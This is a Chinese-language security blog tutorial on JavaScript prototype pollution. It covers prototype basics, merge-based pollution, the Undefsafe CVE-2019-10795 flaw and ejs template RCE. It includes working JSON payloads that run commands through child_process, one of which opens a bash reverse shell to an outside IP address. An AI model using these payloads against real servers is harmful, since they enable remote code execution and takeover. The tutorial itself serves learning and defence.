<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>

<p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>
<p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p>
<p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__ == Foo.prototype</span><br></pre></td></tr></table></figure>

<p>所以，总结一下：</p>
<ol>
<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
</ol>
<h2 id="new做了什么事情"><a href="#new做了什么事情" class="headerlink" title="new做了什么事情"></a>new做了什么事情</h2><p>new 的过程实际上就是根据构造器的<code>prototype</code>属性创建一个 JavaScript 对象（JSON 结构）的过程，它具有以下步骤：</p>
<ol>
<li>创建一个空的 JSON 结构</li>
<li>以这个新的 JSON 结构为 this，运行类的构造器<code>constructor</code></li>
<li>在程序内部将这个 JSON 结构的<strong>原型</strong>指向构造器的<code>prototype</code></li>
<li>返回这个新的 JSON 结构</li>
</ol>
<p>实例的属性由<code>constructor</code>函数对<code>this</code>添加属性而直接添加于实例（新的 JSON 结构）之下，属性是这个实例独有的，由相同构造器创建的其它实例具有它们独有的属性，互不影响</p>
<p>实例的方法<strong>继承</strong>自构造器的<code>prototype</code>，改变构造器中的<code>prototype</code>的内容将影响到所有由这个构造器创建的实例</p>
<p>当我们访问这个实例的<code>constructor</code>属性时，JavaScript 并没有在这个实例的 JSON 结构中找到对应的属性，转而向它的原型（构造器的<code>prototype</code>）寻找，并找到了<code>constructor</code>属性，然后返回它的值</p>
<p>当我们访问这个实例的<code>__proto__</code>属性时，JavaScript 并没有在这个实例的的 JSON 结构中找到对应的属性，转而向它的原型（构造器的<code>prototype</code>）寻找，在它的原型中也没有找到，转而继续向它的原型的原型（<code>Object.prototype</code>）寻找，并找到了<code>__proto__</code>属性，并返回它的值，由于它是一个 Getter，所以 JavaScript 以所访问的实例为 this 返回了这个 Getter 函数的返回值</p>
<p>我们访问实例的<code>constructor</code>和<code>__proto__</code>属性的过程反映了 JavaScript 中的一个重要概念：<strong>原型</strong></p>
<h2 id="原型链污染是什么"><a href="#原型链污染是什么" class="headerlink" title="原型链污染是什么"></a>原型链污染是什么</h2><p><code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p>
<p>做个简单的实验：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>

<p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241022120446218.png" alt="image-20241022120446218"></p>
<p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
<p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
<h2 id="哪些情况下原型链会被污染"><a href="#哪些情况下原型链会被污染" class="headerlink" title="哪些情况下原型链会被污染"></a>哪些情况下原型链会被污染</h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
<p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p>
<ul>
<li>对象merge</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<p>以对象merge为例，我们想象一个简单的merge函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p>
<p>我们用如下代码实验一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>结果是，合并虽然成功了，但原型链没有被污染：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241022120618935.png" alt="image-20241022120618935"></p>
<p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
<p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p>
<p>我们将代码改成如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241022120654277.png" alt="image-20241022120654277"></p>
<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
<h2 id="Undefsafe-模块原型链污染（CVE-2019-10795）"><a href="#Undefsafe-模块原型链污染（CVE-2019-10795）" class="headerlink" title="Undefsafe 模块原型链污染（CVE-2019-10795）"></a>Undefsafe 模块原型链污染（CVE-2019-10795）</h2><p>Undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;skysec&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">a</span>.<span class="property">b</span>.<span class="property">e</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224120158722.png" alt="image-20241224120158722"></p>
<p>此处是正常的，那么如果我们访问不存在的属性，看看效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509150750175.png" alt="image-20250509150750175"></p>
<p>会发生报错！但是如果我们使用了undefsafe模块，就不会产生报错，而是输出undefined</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224120338705.png" alt="image-20241224120338705"></p>
<p>同时在对对象赋值时，如果目标属性存在undefsafe模块会修改属性值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;skysec&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object)</span><br><span class="line"><span class="title function_">undefsafe</span>(object,<span class="string">&quot;a.b.e&quot;</span>,<span class="string">&quot;114514&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224120429649.png" alt="image-20241224120429649"></p>
<p>如果不存在则访问属性会在上层进行创建并赋值</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;skysec&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;__proto__.toString&quot;</span>;</span><br><span class="line"><span class="title function_">undefsafe</span>(object,payload,<span class="string">&quot;evilstring&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">toString</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224120604823.png" alt="image-20241224120604823"></p>
<p>由于toString本身就是存在，我们通过Undefsafe将其更改成了我们想要执行的语句。也就是说当undefsafe()函数的第 2，3 个参数可控时，我们便可以污染 object 对象中的值<br> （即使是不存在的属性也可以污染）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> test = &#123;&#125;</span><br><span class="line"><span class="title function_">a</span>(test,<span class="string">&#x27;__proto__.toString&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="keyword">return</span> <span class="string">&#x27;just a evil!&#x27;</span>&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is &#x27;</span>+test)    <span class="comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span></span><br><span class="line"><span class="comment">// this is just a evil!</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224120815321.png" alt="image-20241224120815321"></p>
<h2 id="ejs模板引擎RCE"><a href="#ejs模板引擎RCE" class="headerlink" title="ejs模板引擎RCE"></a>ejs模板引擎RCE</h2><p>版本 3.1.6 或更早版本</p>
<p>RCE的前提是需要有原型链污染, 例如一个简单的登录界面</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;    </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;login success!&#x27;</span>&#125;);  </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;login fail!&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>跟进 copy() 函数可以看到合并两个数组内容到第一个数组</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>那我们就有一个可以污染的口子, 在 app.js 里可以得知使用的是 ejs 模板引擎</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.engine(&#x27;html&#x27;, require(&#x27;ejs&#x27;).__express); </span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;html&#x27;);</span><br></pre></td></tr></table></figure>

<p>ejs 的 renderFile 进入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exports.renderFile = function () &#123;</span><br><span class="line">...</span><br><span class="line">return tryHandleCache(opts, data, cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>跟进 tryHandleCache 函数, 发现一定会进入 handleCache 函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509150815555.png" alt="image-20250509150815555"></p>
<p>跟进 handleCache 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function handleCache(options, template) &#123;</span><br><span class="line">...</span><br><span class="line">    func = exports.compile(template, options);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509150921439.png" alt="image-20250509150921439"></p>
<p>如果能够覆盖 <code>opts.outputFunctionName</code> , 这样我们构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE</p>
<blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="comment">// After injection</span></span><br><span class="line">prepended += <span class="string">&#x27; var __tmp1; return global.process.mainModule.constructor._load(&#x27;</span>child_process<span class="string">&#x27;).execSync(&#x27;</span>dir<span class="string">&#x27;); __tmp2 = __append;&#x27;</span></span><br><span class="line"><span class="comment">// 拼接了命令语句</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>在污染了原型链之后, 渲染直接变成了执行代码, 经过 return 体前返回, 即可 getshell, POC 如下</p>
<blockquote>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;a=1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); //&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); __tmp2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\&quot;&#x27;); __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>进行 copy 函数后, 此时 <code>outputFunctionName</code> 已经在全局变量中被复制了, 可以在 Global 的 <code>__proto__</code> 的 <code>__proto__</code> 的 <code>__proto__</code> 下找到我们的污染链</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509150948281.png" alt="image-20250509150948281"></p>
<p>再次刷新页面进行渲染时就会把我们写入的拼接, 执行我们输入的命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151014518.png" alt="image-20250509151014518"></p>
<p><strong>同样 ejs 模板还存在另一处 RCE</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> escapeFn = opts.<span class="property">escapeFunction</span>;</span><br><span class="line"><span class="keyword">var</span> ctor;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">client</span>) &#123;</span><br><span class="line">    src = <span class="string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">compileDebug</span>) &#123;</span><br><span class="line">        src = <span class="string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>伪造 <code>opts.escapeFunction</code> 也可以进行 RCE</p>
<blockquote>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;client&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span><span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span><span class="punctuation">,</span><span class="attr">&quot;compileDebug&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;client&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span><span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span><span class="punctuation">,</span><span class="attr">&quot;compileDebug&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;debug&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>可以看到 <code>escapeFunction</code> 已经在全局变量中被复制了</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151038739.png" alt="image-20250509151038739"></p>
<p>再次刷新页面进行渲染时就会把我们写入的拼接, 执行我们输入的命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151052125.png" alt="image-20250509151052125"></p>
<p>添加 <code>&quot;debug&quot;:true</code> 污染时可以在调试时候看到自己赋值的命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151117340.png" alt="image-20250509151117340"></p>
<p>一些常用payload：</p>
